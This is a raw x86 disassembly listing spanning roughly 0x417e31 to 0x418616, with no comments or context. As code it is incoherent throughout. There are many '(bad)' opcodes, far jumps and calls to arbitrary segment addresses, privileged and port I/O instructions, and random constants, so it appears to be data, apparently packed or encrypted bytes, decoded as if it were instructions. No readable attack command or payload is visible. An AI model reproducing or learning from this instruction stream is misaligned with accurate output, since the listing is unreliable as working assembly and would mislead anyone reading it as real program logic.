  417e31:	xchg   ebp,eax
  417e32:	lahf   
  417e33:	(bad)  
  417e34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e35:	fisubr DWORD PTR [ecx+0x70]
  417e38:	(bad)  
  417e3a:	lahf   
  417e3b:	xchg   esi,eax
  417e3c:	lock mov al,0xce
  417e3f:	add    al,0xc6
  417e41:	retf   
  417e42:	add    eax,0x7f3252a6
  417e47:	and    DWORD PTR [edi],esp
  417e49:	xchg   esi,eax
  417e4a:	inc    esp
  417e4b:	push   esi
  417e4c:	fnstsw WORD PTR [edi-0x41ea52b7]
  417e52:	fdivp  st(7),st
  417e54:	pop    edx
  417e55:	(bad)  
  417e56:	mov    ds:0xf99ce8f0,eax
  417e5b:	fdiv   DWORD PTR [eax-0x7d15b56]
  417e61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417e62:	xchg   ebp,eax
  417e63:	popa   
  417e64:	adc    eax,0x66ad4352
  417e69:	push   ss
  417e6a:	mov    edi,edi
  417e6c:	sub    al,0x51
  417e6e:	xchg   esi,eax
  417e6f:	mov    bl,0x88
  417e71:	mov    ebp,0x91b739e1
  417e76:	mov    ebx,0xcf8683e7
  417e7b:	popa   
  417e7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417e7d:	loope  0x417e77
  417e7f:	fld1   
  417e81:	(bad)  
  417e82:	icebp  
  417e83:	(bad)  
  417e84:	sahf   
  417e85:	xor    eax,0xb7d76cba
  417e8a:	push   0x4eecb5c5
  417e8f:	xor    eax,0x6b5afb49
  417e94:	sub    eax,0xffe46566
  417e99:	pop    ds
  417e9a:	jo     0x417e33
  417e9c:	push   edx
  417e9d:	and    dh,BYTE PTR ds:0x58a4
  417ea2:	push   edi
  417ea3:	cwde   
  417ea4:	scas   al,BYTE PTR es:[edi]
  417ea5:	and    BYTE PTR [eax],cl
  417ea7:	in     al,dx
  417ea8:	ret    0x8a87
  417eab:	out    dx,eax
  417eac:	jl     0x417e79
  417eae:	dec    esi
  417eaf:	cwde   
  417eb0:	addr16 daa 
  417eb2:	fidiv  WORD PTR [ebx]
  417eb4:	lods   eax,DWORD PTR ds:[esi]
  417eb5:	popa   
  417eb6:	inc    eax
  417eb7:	push   ecx
  417eb8:	jae    0x417ec3
  417eba:	popa   
  417ebb:	(bad)  
  417ebc:	stos   BYTE PTR es:[edi],al
  417ebd:	or     bh,BYTE PTR [edi+0x59]
  417ec0:	sub    BYTE PTR [esi],cl
  417ec2:	ins    DWORD PTR es:[edi],dx
  417ec3:	and    bl,BYTE PTR [esi]
  417ec5:	retf   0x28
  417ec8:	aam    0x9f
  417eca:	jns    0x417f3f
  417ecc:	outs   dx,DWORD PTR ds:[esi]
  417ecd:	iret   
  417ece:	je     0x417e79
  417ed0:	mov    edi,0x7da8c6e7
  417ed5:	push   edi
  417ed6:	jmp    0x417ecd
  417ed8:	sbb    eax,0x4646c3ee
  417edd:	xchg   DWORD PTR [edi+0x46],edx
  417ee0:	jp     0x417ec1
  417ee2:	xor    BYTE PTR [eax],bh
  417ee4:	dec    eax
  417ee5:	iret   
  417ee6:	cs add ebx,0x7e
  417eea:	push   ss
  417eeb:	ins    DWORD PTR es:[edi],dx
  417eec:	pop    esi
  417eed:	adc    eax,0x1018b848
  417ef2:	sub    eax,0x184e9717
  417ef7:	enter  0xfd2c,0xf3
  417efb:	jl     0x417ef3
  417efd:	mov    al,0x39
  417eff:	mov    al,0x4a
  417f01:	call   0x7b191d1c
  417f06:	add    eax,0xe0c19c47
  417f0b:	lods   eax,DWORD PTR ds:[esi]
  417f0c:	(bad)  
  417f0d:	and    esi,DWORD PTR [esi]
  417f0f:	xchg   ebp,eax
  417f10:	test   eax,0xd522cac2
  417f15:	fscale 
  417f17:	dec    edx
  417f18:	and    BYTE PTR [esi-0x76],bh
  417f1b:	cmp    al,0xd6
  417f1d:	loop   0x417f29
  417f1f:	gs cmp al,0xc6
  417f22:	pop    eax
  417f23:	add    cl,BYTE PTR [esi+0x4d9e32be]
  417f29:	or     al,0x7c
  417f2b:	std    
  417f2c:	nop
  417f2d:	sbb    eax,0x1f0b405a
  417f32:	es inc ebp
  417f34:	mov    ecx,0x7a6c9eee
  417f39:	retf   0x9938
  417f3c:	xor    eax,0x69867c2f
  417f41:	jg     0x417ee4
  417f43:	cmp    bl,bl
  417f45:	lods   eax,DWORD PTR ds:[esi]
  417f46:	sbb    esp,edx
  417f48:	cmp    BYTE PTR [ecx],bh
  417f4a:	adc    DWORD PTR [esi-0x24],ebp
  417f4d:	out    0xdc,eax
  417f4f:	and    DWORD PTR [ebx+esi*8+0x5f],edx
  417f53:	mov    esi,DWORD PTR [ecx-0x5c160357]
  417f59:	inc    ebx
  417f5a:	aam    0xd8
  417f5c:	cli    
  417f5d:	xor    BYTE PTR [eax],ch
  417f5f:	adc    cl,bl
  417f61:	pop    ds
  417f62:	sbb    al,0x79
  417f64:	jb     0x417fa0
  417f66:	add    eax,0x5323cbbc
  417f6b:	dec    esp
  417f6c:	mov    gs,WORD PTR [ebx-0x67]
  417f6f:	test   al,0x7b
  417f71:	stc    
  417f72:	mov    dl,0x89
  417f74:	push   ds
  417f75:	cld    
  417f76:	xchg   ebp,eax
  417f77:	cmp    BYTE PTR [ebx+ecx*8-0x36d682f7],dl
  417f7e:	shl    eax,0xca
  417f81:	pop    es
  417f82:	loope  0x417f35
  417f84:	(bad)  
  417f85:	ins    DWORD PTR es:[edi],dx
  417f86:	out    dx,eax
  417f87:	in     al,0x95
  417f89:	stc    
  417f8a:	pop    esi
  417f8b:	fnstsw WORD PTR [ebp-0x5d80ab8e]
  417f91:	out    dx,eax
  417f92:	inc    ecx
  417f93:	xor    eax,0xa1970921
  417f98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417f99:	fyl2x  
  417f9b:	and    ebx,DWORD PTR [eax-0x4be1f48]
  417fa1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417fa2:	push   ebp
  417fa3:	mov    ah,0x9b
  417fa5:	mov    bh,0x2f
  417fa7:	loopne 0x418000
  417fa9:	dec    edi
  417faa:	gs or  eax,0x9ef9c032
  417fb0:	add    al,0xe9
  417fb2:	scas   al,BYTE PTR es:[edi]
  417fb3:	jp     0x417fce
  417fb5:	imul   esi,DWORD PTR [edx+esi*2+0x2],0x9f494d99
  417fbd:	or     DWORD PTR [edi+0x3240486d],esp
  417fc3:	jmp    0x459f:0x793bb23f
  417fca:	daa    
  417fcb:	pop    ecx
  417fcc:	cwde   
  417fcd:	rol    DWORD PTR [ebx-0x2fb5f395],1
  417fd3:	adc    dl,BYTE PTR es:[ebp-0x14]
  417fd7:	imul   ecx,DWORD PTR [ecx],0x34
  417fda:	call   0x6e9b:0xf42c28bc
  417fe1:	mov    ebx,0xe54bb7a6
  417fe6:	addr16 pop ss
  417fe8:	nop
  417fe9:	adc    al,0x66
  417feb:	xchg   ecx,eax
  417fec:	sub    ecx,DWORD PTR [esp+ecx*8+0x8]
  417ff0:	(bad)  
  417ff1:	in     eax,dx
  417ff2:	jecxz  0x418009
  417ff4:	(bad)  
  417ff5:	mov    eax,0xb6a25450
  417ffa:	dec    eax
  417ffb:	pop    ebp
  417ffc:	add    eax,0x7c2ac774
  418001:	dec    eax
  418002:	mov    bh,0x61
  418004:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418005:	sub    eax,0x6d7fc217
  41800a:	addr16 and edx,esp
  41800d:	icebp  
  41800e:	push   eax
  41800f:	or     eax,0x30f70104
  418014:	pop    esp
  418015:	jecxz  0x417fcc
  418017:	xor    DWORD PTR [edi],0xe5feae88
  41801d:	jecxz  0x41808f
  41801f:	mov    al,0xfd
  418021:	inc    esi
  418022:	retf   
  418023:	dec    esp
  418024:	and    al,al
  418026:	inc    esp
  418027:	ja     0x417fdf
  418029:	(bad)  
  41802a:	mov    ds:0x2f2981d7,al
  41802f:	out    dx,eax
  418030:	ja     0x417fe0
  418032:	out    0x86,eax
  418034:	xor    DWORD PTR [ebx+ebx*1],ecx
  418037:	dec    eax
  418038:	jo     0x4180b5
  41803a:	test   BYTE PTR [eax+ecx*1-0x60],dh
  41803e:	call   0xc929c544
  418043:	or     BYTE PTR [eax-0xbf0038c],bh
  418049:	imul   esi,DWORD PTR [eax+0x1e66819d],0xffffffa5
  418050:	js     0x418032
  418052:	(bad)  
  418053:	and    ecx,ecx
  418055:	phaddw mm6,QWORD PTR [eax+0x54]
  41805a:	mov    cl,0x13
  41805c:	jmp    0x9877:0x650d2526
  418063:	stos   BYTE PTR es:[edi],al
  418064:	rol    BYTE PTR [esi-0x408576e4],cl
  41806a:	dec    ebp
  41806b:	mov    dh,0xda
  41806d:	jl     0x41805f
  41806f:	push   edx
  418070:	add    al,0x9e
  418072:	inc    ecx
  418073:	jl     0x418042
  418075:	loope  0x41801a
  418077:	cmp    bl,BYTE PTR [esi+ebp*1]
  41807a:	nop
  41807b:	frstorw [ebx-0xa]
  41807f:	test   BYTE PTR [ecx],dh
  418081:	mov    al,ds:0x93611a0a
  418086:	clc    
  418087:	adc    esi,DWORD PTR [eax-0x1b]
  41808a:	mov    esp,0x8ba81bf1
  41808f:	push   0xd9a3c6a7
  418094:	ret    
  418095:	out    dx,eax
  418096:	loope  0x41805c
  418098:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418099:	(bad)  
  41809a:	or     ebp,DWORD PTR ds:0x5113603f
  4180a0:	inc    edi
  4180a1:	ja     0x4180c6
  4180a3:	mov    al,ah
  4180a5:	push   edi
  4180a6:	rol    BYTE PTR [edi-0x6c],cl
  4180a9:	mov    ds:0xedd8063f,eax
  4180ae:	xor    al,0x9f
  4180b0:	outs   dx,BYTE PTR ds:[esi]
  4180b1:	pushf  
  4180b2:	jge    0x418038
  4180b4:	and    dh,bl
  4180b6:	sbb    al,0x13
  4180b8:	shl    al,1
  4180ba:	mov    ah,0x8a
  4180bc:	int3   
  4180bd:	mov    ebp,0x5dabb34e
  4180c2:	sub    DWORD PTR [edi-0x7],esp
  4180c5:	scas   al,BYTE PTR es:[edi]
  4180c6:	es hlt 
  4180c8:	jmp    0xa121:0xe6e29b1e
  4180cf:	push   esp
  4180d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4180d1:	mov    ah,0xc9
  4180d3:	xchg   DWORD PTR [edx],edx
  4180d5:	adc    eax,DWORD PTR [ebx+0x33]
  4180d8:	fwait
  4180d9:	sub    BYTE PTR [edi],dh
  4180db:	cmc    
  4180dc:	outs   dx,BYTE PTR es:[esi]
  4180de:	add    BYTE PTR [ecx+0x44c75257],al
  4180e4:	push   esp
  4180e5:	fisub  DWORD PTR [ebx]
  4180e7:	and    bh,BYTE PTR [eax-0x2]
  4180ea:	cmc    
  4180eb:	out    dx,al
  4180ec:	adc    dl,BYTE PTR [eax-0x1e]
  4180ef:	mov    eax,ds:0x85b8fbab
  4180f4:	frstor [esi-0x1c]
  4180f7:	xor    DWORD PTR [eax-0x2b5474ac],eax
  4180fd:	jne    0x4180fb
  4180ff:	sub    edi,esi
  418101:	xchg   DWORD PTR [ecx+0x2d],edi
  418104:	add    DWORD PTR [esi-0x4135dcc3],ebx
  41810a:	aas    
  41810b:	in     eax,dx
  41810c:	mov    edx,0xb88dc215
  418111:	xchg   edx,eax
  418112:	sbb    eax,0x6f41f3b3
  418117:	xlat   BYTE PTR ds:[ebx]
  418118:	je     0x4180f1
  41811a:	xchg   edx,eax
  41811b:	pop    ss
  41811c:	push   eax
  41811d:	ficom  DWORD PTR [esi-0x54]
  418120:	xchg   ecx,eax
  418121:	jle    0x418126
  418123:	mov    eax,ds:0x2e41995d
  418128:	sub    BYTE PTR [esi+eax*1],al
  41812b:	xor    al,0x26
  41812d:	fiadd  DWORD PTR [ecx-0x9]
  418130:	std    
  418131:	(bad)  
  418132:	jno    0x4180cf
  418134:	jmp    0x4180d2
  418136:	inc    ecx
  418137:	in     al,dx
  418138:	lods   al,BYTE PTR ds:[esi]
  418139:	inc    esi
  41813a:	lock popa 
  41813c:	loop   0x418133
  41813e:	push   cs
  41813f:	and    eax,0xd3945481
  418144:	mov    esp,0xcc809dfc
  418149:	add    DWORD PTR [edx+0x4b],ecx
  41814c:	push   esi
  41814d:	jae    0x4180d9
  41814f:	outs   dx,BYTE PTR ds:[esi]
  418150:	jmp    0xc0e2:0x92e3be66
  418157:	sbb    eax,DWORD PTR [eax]
  418159:	sbb    ecx,DWORD PTR [edi]
  41815b:	adc    BYTE PTR [edi-0x121d729e],dl
  418161:	mov    ebp,0x312f09f0
  418166:	aaa    
  418167:	outs   dx,BYTE PTR fs:[esi]
  418169:	fldenv [edi+0x5a6c8a7e]
  41816f:	loop   0x418174
  418171:	xlat   BYTE PTR ds:[ebx]
  418172:	sub    edi,DWORD PTR [ebx+0x13bce3e8]
  418178:	jo     0x418190
  41817a:	xchg   edi,eax
  41817b:	sbb    edi,DWORD PTR [ecx+0x5d]
  41817e:	mov    edx,0x2e6068a5
  418183:	icebp  
  418184:	sbb    eax,0x74af9c0
  418189:	xor    ch,BYTE PTR [edx+0x52198638]
  41818f:	repz jl 0x4181d8
  418192:	cmp    DWORD PTR ds:0x1651c383,esp
  418198:	jmp    0x732ff4f7
  41819d:	inc    eax
  41819e:	jb     0x4181bc
  4181a0:	mov    eax,ds:0x317d1a93
  4181a5:	mov    edx,0x691c00af
  4181aa:	aam    0x92
  4181ac:	pop    esp
  4181ad:	sub    eax,0x30e50c6c
  4181b2:	scas   eax,DWORD PTR es:[edi]
  4181b3:	clc    
  4181b4:	xchg   ebp,eax
  4181b5:	test   BYTE PTR [edx],bl
  4181b7:	sub    BYTE PTR [esi-0x69],cl
  4181ba:	mov    ebp,DWORD PTR [ebx+ecx*2-0x3ee246ce]
  4181c1:	or     eax,0xee84c7a7
  4181c6:	inc    esi
  4181c7:	mov    esi,0x4cb3257c
  4181cc:	sbb    BYTE PTR [ebp+0x6f],ch
  4181cf:	dec    ecx
  4181d0:	popa   
  4181d1:	push   0x42
  4181d3:	inc    ebp
  4181d4:	pop    ss
  4181d5:	rol    ah,0xb2
  4181d8:	arpl   WORD PTR [ecx],cx
  4181da:	dec    ecx
  4181db:	add    BYTE PTR [edi-0x7f8dc298],dh
  4181e1:	push   esp
  4181e2:	repnz fiadd WORD PTR [ebx+0x39]
  4181e6:	sub    DWORD PTR [eax+ebp*1],ebp
  4181e9:	popf   
  4181ea:	mov    eax,0x15efe68d
  4181ef:	data16 repnz cmp dh,dh
  4181f3:	ins    DWORD PTR es:[edi],dx
  4181f4:	jb     0x41825c
  4181f6:	(bad)  
  4181f7:	and    al,BYTE PTR [esp+edx*4-0x74]
  4181fb:	or     BYTE PTR [esi*8-0x7830c48a],dh
  418202:	scas   eax,DWORD PTR es:[edi]
  418203:	xchg   esi,eax
  418204:	js     0x418208
  418206:	jmp    0xfd06:0x20afcfd5
  41820d:	(bad)  
  41820e:	xor    BYTE PTR [edx],0x82
  418211:	(bad)  
  418212:	cmp    al,0x9a
  418214:	(bad)  
  418215:	jmp    0x3aba:0xcea80602
  41821c:	mov    ecx,0x903c8aa1
  418221:	fisub  WORD PTR [ecx]
  418223:	dec    eax
  418224:	enter  0x3081,0x8a
  418228:	mov    dl,BYTE PTR [ecx-0x18bf5742]
  41822e:	inc    ecx
  41822f:	push   ss
  418230:	xlat   BYTE PTR ds:[ebx]
  418231:	aaa    
  418232:	retf   
  418233:	jmp    0x32904a0a
  418238:	jne    0x418253
  41823a:	(bad)  
  41823b:	jb     0x4181bd
  41823d:	add    esi,DWORD PTR [ecx+ebx*8]
  418240:	dec    eax
  418241:	sbb    edx,ecx
  418243:	xchg   edi,eax
  418244:	adc    BYTE PTR [edx-0x30],al
  418247:	stos   BYTE PTR es:[edi],al
  418248:	in     al,0xdc
  41824a:	stos   BYTE PTR es:[edi],al
  41824b:	ret    
  41824c:	sbb    DWORD PTR ds:0x819c6bc4,edi
  418252:	popf   
  418253:	add    BYTE PTR [eax],0xf0
  418256:	jmp    0x418202
  418258:	fnstsw WORD PTR [edi-0x312f5a55]
  41825e:	std    
  41825f:	fwait
  418260:	mov    ebx,DWORD PTR [ebp+0x821eb17]
  418266:	sub    BYTE PTR [ebx-0x21fc72b3],bh
  41826c:	mov    DWORD PTR [ebp+0x2612a9ab],ebx
  418272:	pop    ds
  418273:	test   eax,0xab98a7fd
  418278:	pop    ds
  418279:	pusha  
  41827a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41827b:	out    dx,al
  41827c:	nop
  41827d:	mov    al,ds:0xb4bd60c8
  418282:	icebp  
  418283:	mov    ds:0x6e3442ea,al
  418288:	fistp  DWORD PTR [edi+0x4d7e8d24]
  41828e:	xor    eax,0x5b2efc56
  418293:	fcomp  DWORD PTR [ebx]
  418295:	lock fidiv DWORD PTR [ecx-0x1d]
  418299:	fnstcw WORD PTR [ebx-0x6ec18c92]
  41829f:	outs   dx,DWORD PTR ds:[esi]
  4182a0:	jge    0x418279
  4182a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4182a3:	jmp    0xc17d44f9
  4182a8:	cld    
  4182a9:	xchg   edx,eax
  4182aa:	test   DWORD PTR [ecx+ecx*1+0x4d28135d],0x16ab1ecc
  4182b5:	sbb    DWORD PTR [ebx+0x12829c4e],esi
  4182bb:	pop    esp
  4182bc:	ret    
  4182bd:	sti    
  4182be:	or     eax,0x71c7f0aa
  4182c3:	inc    edi
  4182c4:	jge    0x418294
  4182c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4182c7:	pop    es
  4182c8:	mov    edx,0x5552a81c
  4182cd:	arpl   WORD PTR [esi-0x74d9544a],bx
  4182d3:	(bad)  
  4182d4:	leave  
  4182d5:	pop    esp
  4182d6:	xlat   BYTE PTR ds:[ebx]
  4182d7:	jb     0x4182fe
  4182d9:	cwde   
  4182da:	nop
  4182db:	fsub   QWORD PTR [eax-0x1478448e]
  4182e1:	retf   0x680
  4182e4:	pusha  
  4182e5:	loopne 0x418300
  4182e7:	inc    ebp
  4182e8:	mov    DWORD PTR [ebx],edi
  4182ea:	in     al,0xc6
  4182ec:	mov    edx,0xbdff168f
  4182f1:	jns    0x41833d
  4182f3:	jmp    0x9dd5:0x3dceea34
  4182fa:	adc    eax,esp
  4182fc:	cmc    
  4182fd:	inc    eax
  4182fe:	jmp    0x4182a6
  418300:	adc    cl,BYTE PTR [ebp-0x6c]
  418303:	mov    ebp,0xb4c194bc
  418308:	(bad)  
  418309:	out    dx,al
  41830a:	jmp    0x701a:0x15cbc5c
  418311:	and    BYTE PTR [ebp-0x17],ch
  418314:	cmp    eax,0x5d008889
  418319:	shr    bl,1
  41831b:	out    dx,eax
  41831c:	loope  0x4182a6
  41831e:	out    0x9b,al
  418320:	into   
  418321:	xor    al,0x1e
  418323:	add    ecx,DWORD PTR [ebx-0x778ec9c2]
  418329:	rcr    DWORD PTR [esi+0x411a3d8a],1
  41832f:	and    al,0x8e
  418331:	pop    eax
  418332:	jns    0x4182e3
  418334:	jbe    0x88e3c30c
  41833a:	test   DWORD PTR [esi*2-0x50b41fe2],0x7b86c952
  418345:	sbb    BYTE PTR cs:[ebx+0xb],0x4e
  41834a:	imul   edi,ebp,0x405ed173
  418350:	and    eax,0x404fed55
  418355:	xchg   BYTE PTR [eax+edi*8+0x1c8bbac8],cl
  41835c:	push   ss
  41835d:	xchg   DWORD PTR [edi],edx
  41835f:	sbb    al,0x49
  418361:	(bad)  
  418362:	cmp    cl,al
  418364:	icebp  
  418365:	mov    BYTE PTR [ecx],al
  418367:	das    
  418368:	fimul  WORD PTR [ecx+0x59cf96a7]
  41836e:	adc    BYTE PTR [ecx-0x7],dl
  418371:	call   0x49c1bb8b
  418376:	pop    ebx
  418377:	add    al,0x50
  418379:	stc    
  41837a:	in     eax,0xd5
  41837c:	aam    0xc1
  41837e:	inc    esi
  41837f:	inc    ebp
  418380:	dec    ecx
  418381:	stc    
  418382:	call   0x651f:0xa01eed24
  418389:	and    eax,0xdc3abe95
  41838e:	jae    0x4183a7
  418390:	ret    0x9c63
  418393:	adc    ah,BYTE PTR [ebx+0x78]
  418396:	adc    cl,BYTE PTR [ebx+0x5ffea106]
  41839c:	(bad)  
  41839e:	jbe    0x41838e
  4183a0:	mov    bh,0x1e
  4183a2:	jge    0x418363
  4183a4:	inc    ecx
  4183a5:	retf   0xc3b4
  4183a8:	cmc    
  4183a9:	ins    BYTE PTR es:[edi],dx
  4183aa:	lock repnz sub al,0x66
  4183ae:	cmp    al,bl
  4183b0:	jne    0x41833c
  4183b2:	pop    ebp
  4183b3:	aas    
  4183b4:	cmp    DWORD PTR [eax-0x35],0xd38fa2a2
  4183bb:	call   0x3ccbf5
  4183c0:	mov    cl,0x1b
  4183c2:	mov    esi,0xaa31ff0b
  4183c7:	add    ebp,DWORD PTR [edx]
  4183c9:	sbb    al,0xe9
  4183cb:	ja     0x41840f
  4183cd:	ret    
  4183ce:	data16 jne 0x41840c
  4183d1:	inc    esp
  4183d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4183d3:	mov    esi,DWORD PTR [edx+0x697eae8d]
  4183d9:	lahf   
  4183da:	mov    cl,0x1
  4183dc:	jg     0x418389
  4183de:	sub    bh,BYTE PTR [edx-0x3ab3cb2e]
  4183e4:	and    ebx,esp
  4183e6:	cmp    eax,0x404acac6
  4183eb:	aam    0x5a
  4183ed:	ins    BYTE PTR es:[edi],dx
  4183ee:	std    
  4183ef:	jbe    0x4183ef
  4183f1:	cmp    eax,0xb60fc036
  4183f6:	addr16 dec ecx
  4183f8:	xchg   ebx,eax
  4183f9:	sub    al,0x1b
  4183fb:	mov    ds:0x5cb4a239,al
  418400:	or     ebp,DWORD PTR [ebp-0x6191a41d]
  418406:	mov    edx,0x880ec439
  41840b:	pop    ecx
  41840c:	clc    
  41840d:	call   0x124cad12
  418412:	sar    BYTE PTR [ecx-0x6bbeba53],cl
  418418:	stos   BYTE PTR es:[edi],al
  418419:	dec    esp
  41841a:	jb     0x418479
  41841c:	inc    esi
  41841d:	(bad)
  418422:	cmp    al,0x64
  418424:	jns    0x4183d2
  418426:	adc    bh,BYTE PTR [esi-0x44]
  418429:	in     eax,dx
  41842a:	pusha  
  41842b:	or     DWORD PTR [ebx+eax*2],esi
  41842e:	sbb    BYTE PTR [edi+0xb],cl
  418431:	pop    ebx
  418432:	sti    
  418433:	in     eax,0xa5
  418435:	outs   dx,BYTE PTR ds:[esi]
  418436:	ss jo  0x418405
  418439:	xchg   edx,ecx
  41843b:	push   edi
  41843c:	jmp    0x4183f9
  41843e:	mov    edx,0xf34cca97
  418443:	ror    al,0x69
  418446:	(bad)  
  418447:	and    eax,eax
  418449:	jecxz  0x4184c4
  41844b:	repz pusha 
  41844d:	pop    esi
  41844e:	pop    ebx
  41844f:	fdivr  QWORD PTR [ebp+0x44]
  418452:	xchg   esp,eax
  418453:	call   0x17008bc5
  418458:	xor    BYTE PTR [eax+0x53],bl
  41845b:	sti    
  41845c:	or     al,ah
  41845e:	cmp    BYTE PTR ds:0x83783bb6,bh
  418464:	pop    es
  418465:	pop    edx
  418466:	mov    al,0x4f
  418468:	jno    0x418464
  41846a:	push   ss
  41846b:	dec    esi
  41846c:	push   cs
  41846d:	adc    bx,WORD PTR [esi-0xc4e2833]
  418474:	sub    BYTE PTR [edi+0x256bbb0c],0xe2
  41847b:	cdq    
  41847c:	mov    ah,0x3a
  41847e:	popf   
  41847f:	sbb    bh,bh
  418481:	inc    eax
  418482:	scas   al,BYTE PTR es:[edi]
  418483:	or     al,0x8b
  418485:	pop    ebp
  418486:	lea    esp,[edi]
  418488:	jmp    0xb194:0x516afbed
  41848f:	or     al,0xba
  418491:	in     al,0xd2
  418493:	pop    ss
  418494:	or     DWORD PTR [edi],ebp
  418496:	stos   BYTE PTR es:[edi],al
  418497:	mov    esi,0xd101ad1e
  41849c:	add    dl,BYTE PTR [esi+0x61]
  41849f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4184a0:	shl    ecx,1
  4184a2:	pop    edx
  4184a3:	adc    ebp,DWORD PTR [eax]
  4184a5:	mov    ah,0x86
  4184a7:	dec    esi
  4184a8:	mov    ch,0xa8
  4184aa:	mov    ds:0xecfb7bee,al
  4184af:	push   0x65
  4184b1:	pop    edi
  4184b2:	inc    esi
  4184b3:	scas   al,BYTE PTR es:[edi]
  4184b4:	cli    
  4184b5:	fnsave [edx+0x63148c2f]
  4184bb:	lock lods eax,DWORD PTR ds:[esi]
  4184bd:	mov    ch,0xc9
  4184bf:	mov    edi,0xe8f22a40
  4184c4:	sti    
  4184c5:	cmp    bl,bl
  4184c7:	xchg   BYTE PTR [eax],cl
  4184c9:	xchg   esp,eax
  4184ca:	hlt    
  4184cb:	and    ebp,DWORD PTR [edx+0x54]
  4184ce:	mov    ds:0xd63da65f,al
  4184d3:	sbb    al,0xe0
  4184d5:	rcr    BYTE PTR [edx-0x2769050a],1
  4184db:	loopne 0x418493
  4184dd:	out    dx,al
  4184de:	rol    dh,cl
  4184e0:	mov    dl,0x86
  4184e2:	add    al,0x20
  4184e4:	or     al,0xe3
  4184e6:	les    edi,FWORD PTR [ecx+edi*4+0xf]
  4184ea:	mov    dh,0x97
  4184ec:	xchg   ebx,eax
  4184ed:	pop    esi
  4184ee:	lock std 
  4184f0:	scas   eax,DWORD PTR es:[edi]
  4184f1:	and    eax,0x731e311a
  4184f6:	retf   0xd8cd
  4184f9:	push   es
  4184fa:	outs   dx,DWORD PTR ds:[si]
  4184fc:	loop   0x418480
  4184fe:	xchg   esi,eax
  4184ff:	mov    edx,0xb1ec14ec
  418504:	push   ds
  418505:	xchg   DWORD PTR cs:[ebp+0x69],edx
  418509:	mov    ch,0x27
  41850b:	test   BYTE PTR [ebx],0x77
  41850e:	push   ebx
  41850f:	pusha  
  418510:	jbe    0x41850b
  418512:	pop    esi
  418513:	mov    ecx,0x4f09caa4
  418518:	retf   
  418519:	mov    al,ds:0xd0b6f5f2
  41851e:	push   esp
  41851f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418520:	or     DWORD PTR [ebx],edx
  418522:	sbb    BYTE PTR [ebx+ecx*2],al
  418525:	retf   0xd599
  418528:	inc    esp
  418529:	xlat   BYTE PTR ds:[ebx]
  41852a:	mov    dh,0x80
  41852c:	dec    esi
  41852d:	push   ebx
  41852e:	retf   0x69bf
  418531:	mov    edi,0x597aa9ee
  418536:	mov    eax,0x4efc1e4
  41853b:	xor    DWORD PTR ds:0x998b0f1a,ebp
  418541:	sbb    al,0x3d
  418543:	dec    ebx
  418544:	sbb    eax,0xa2603351
  418549:	jmp    0xcaa6:0xb77ff5d9
  418550:	xchg   esi,eax
  418551:	sub    eax,0x5a3c7e33
  418556:	push   es
  418557:	sbb    BYTE PTR [edi],0xea
  41855a:	xchg   DWORD PTR [edi+0xc67ce79],esi
  418560:	stc    
  418561:	pop    edx
  418562:	and    dh,bh
  418564:	(bad)  
  418565:	sbb    ah,BYTE PTR [edx]
  418567:	popa   
  418568:	lods   al,BYTE PTR ds:[esi]
  418569:	mov    ecx,0x8f7d8d33
  41856e:	push   0xffffffd4
  418570:	jg     0x4184f8
  418572:	mov    esi,ecx
  418574:	xor    esp,edi
  418576:	mov    DWORD PTR [eax-0x27638129],esi
  41857c:	ficom  WORD PTR [eax]
  41857e:	push   cs
  41857f:	mov    ah,0x2d
  418581:	cdq    
  418582:	pop    edx
  418583:	ds mov ch,0xf1
  418586:	lds    ecx,FWORD PTR [ebx]
  418588:	xchg   BYTE PTR [edx-0x6484adeb],bl
  41858e:	sbb    dl,BYTE PTR [ebx+0x2c]
  418591:	sbb    esp,esi
  418593:	jge    0x4185fa
  418595:	pop    esi
  418596:	popa   
  418597:	jl     0x4185f4
  418599:	outs   dx,DWORD PTR ds:[esi]
  41859a:	in     al,0xa7
  41859c:	iret   
  41859d:	js     0x418540
  41859f:	data16 sbb al,BYTE PTR [ebx-0x7d7ec6f3]
  4185a6:	pop    esi
  4185a7:	sbb    DWORD PTR [eax-0x4b80d00e],ebp
  4185ad:	ret    
  4185ae:	xchg   edx,eax
  4185af:	xor    BYTE PTR [eax],0x4a
  4185b2:	sub    eax,0x47f12714
  4185b7:	push   cs
  4185b8:	push   ebx
  4185ba:	dec    ecx
  4185bb:	and    bh,BYTE PTR [esi+0x50]
  4185be:	in     eax,dx
  4185bf:	icebp  
  4185c0:	mov    ebp,0xcae579d1
  4185c5:	scas   al,BYTE PTR es:[edi]
  4185c6:	mov    esi,0x56062634
  4185cb:	pop    ecx
  4185cc:	xchg   edi,eax
  4185cd:	repnz cmp ch,bl
  4185d0:	sahf   
  4185d1:	sub    DWORD PTR [edi-0x729d0dc9],esp
  4185d7:	sub    dl,BYTE PTR [esi]
  4185d9:	push   es
  4185da:	loopne 0x4185c3
  4185dc:	jmp    0x2661149b
  4185e1:	out    0x91,al
  4185e3:	nop
  4185e4:	and    DWORD PTR [ecx+0x55],0x9f3495e
  4185eb:	pop    esi
  4185ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4185ed:	fild   WORD PTR [eax+0x54abce17]
  4185f3:	fidivr WORD PTR [ebp+0x4f]
  4185f6:	imul   DWORD PTR [esi+ecx*8-0x1c8a6a45]
  4185fd:	push   ds
  4185fe:	mov    dh,0xad
  418600:	les    esp,FWORD PTR [esi]
  418602:	iret   
  418603:	stos   BYTE PTR es:[edi],al
  418604:	int3   
  418605:	lea    edi,[esi-0x50]
  418608:	pop    esi
  418609:	adc    edi,DWORD PTR [esi+0x200ebc1d]
  41860f:	cmp    DWORD PTR [edi-0x41721e29],eax
  418615:	nop
  418616:	cs out dx,al
